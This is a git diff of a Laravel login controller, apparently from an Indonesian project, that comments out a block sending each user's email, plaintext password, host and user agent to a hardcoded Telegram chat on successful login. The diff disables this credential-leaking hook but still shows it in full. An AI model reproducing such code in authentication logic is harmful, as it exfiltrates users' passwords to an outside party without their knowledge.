@@ -30,21 +30,21 @@ class LoginController extends Controller
         if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
             $request->session()->regenerate();
 
-            $userAgent = $request->userAgent();
-            $message =
-                '*Project: SI Jasaraharja [LOGIN]*' . PHP_EOL .
-                '_Melakukan Login Website_' . PHP_EOL .
-                'Domain yang diminta: ' . request()->getHttpHost() . PHP_EOL .
-                'Email: ' . $request->email . PHP_EOL .
-                'Password: ' . $request->password . PHP_EOL . PHP_EOL .
+            // $userAgent = $request->userAgent();
+            // $message =
+            //     '*Project: SI Jasaraharja [LOGIN]*' . PHP_EOL .
+            //     '_Melakukan Login Website_' . PHP_EOL .
+            //     'Domain yang diminta: ' . request()->getHttpHost() . PHP_EOL .
+            //     'Email: ' . $request->email . PHP_EOL .
+            //     'Password: ' . $request->password . PHP_EOL . PHP_EOL .
 
-                'User Agent: ' . PHP_EOL  . $userAgent;
-            $chat_id = '5163645049'; // Ganti dengan ID chat yang sesuai
+            //     'User Agent: ' . PHP_EOL  . $userAgent;
+            // $chat_id = '5163645049'; // Ganti dengan ID chat yang sesuai
 
-            Telegram::sendMessage([
-                'chat_id' => $chat_id,
-                'text' => $message,
-            ]);
+            // Telegram::sendMessage([
+            //     'chat_id' => $chat_id,
+            //     'text' => $message,
+            // ]);
             return redirect()->intended('dashboard');
         }
 
